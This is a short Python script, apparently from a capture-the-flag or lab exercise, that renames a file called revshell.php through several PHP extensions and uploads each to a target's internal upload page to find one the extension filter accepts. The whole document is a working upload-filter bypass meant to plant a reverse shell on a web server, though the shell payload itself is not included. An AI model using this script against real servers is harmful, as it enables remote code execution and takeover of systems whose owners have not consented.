import requests
import os

ip = "" #enter here
url = f"http://{ip}:3333/internal/index.php" #change

old_filename = "revshell.php"

filename = "revshell"
extensions = [
	".php",
	".php3",
	".php4",
	".php5",
	".phtml"
]

for ext in extensions:
	new_filename = filename + ext
	os.rename(old_filename, new_filename)

	files = {"file": open(new_filename, "rb")}
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:	#depends on the output
		print(f"{ext} not allowed")
	else:
		print(f"{ext} seems ok")

	old_filename = new_filename
